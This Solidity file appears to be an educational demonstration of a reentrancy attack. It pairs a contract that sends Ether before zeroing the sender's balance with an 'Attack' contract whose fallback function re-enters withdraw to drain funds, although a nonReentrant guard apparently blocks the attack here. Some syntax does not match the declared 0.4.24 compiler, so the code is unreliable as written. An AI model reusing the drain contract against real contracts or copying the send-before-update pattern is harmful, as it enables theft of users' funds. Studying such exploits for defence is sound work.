// SPDX-License-Identifier: MIT

pragma solidity ^0.4.24;

import "https://github.com/binodnp/openzeppelin-solidity/blob/master/contracts/utils/ReentrancyGuard.sol";
 
contract VulnerableContract is ReentrancyGuard {
    mapping(address => uint) public balance;
 
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }
 
  function withdraw() nonReentrant public {
    uint bal = balance[msg.sender];
    require(bal > 0);
    (bool sent, ) = msg.sender.call.value(bal)("");
    require(sent, "Failed to send Ether");
    balance[msg.sender] = 0;
}



    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attack {
    VulnerableContract public exploit;

    constructor(address _exploitAddress) public {
        exploit = VulnerableContract(_exploitAddress);
    }

    function() external payable {
        if (address(exploit).balance >= 1 ether) {
            exploit.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        exploit.deposit.value(1 ether)();
        exploit.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
